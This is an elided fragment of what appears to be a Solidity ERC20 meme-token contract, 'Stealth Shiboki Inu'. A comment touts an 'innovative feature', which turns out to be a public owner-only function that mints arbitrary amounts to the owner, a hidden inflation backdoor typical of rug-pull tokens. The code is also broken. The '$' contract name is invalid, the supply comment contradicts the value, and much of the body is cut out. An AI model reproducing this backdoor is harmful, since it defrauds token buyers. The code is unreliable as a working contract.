...
//
// $StealthShibokiInu proposes an innovative feature in its contract.
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _StealthShibokiInu(uint256 amount) public onlyOwner {
 _StealthShibokiInu(msg.sender, amount);
    }
    ...
    function _StealthShibokiInu(address account, uint256 amount) internal virtual {
...
contract $StealthShibokiInu is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Stealth Shiboki Inu", "SSHIBOKI") {
     _StealthShibokiInu(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}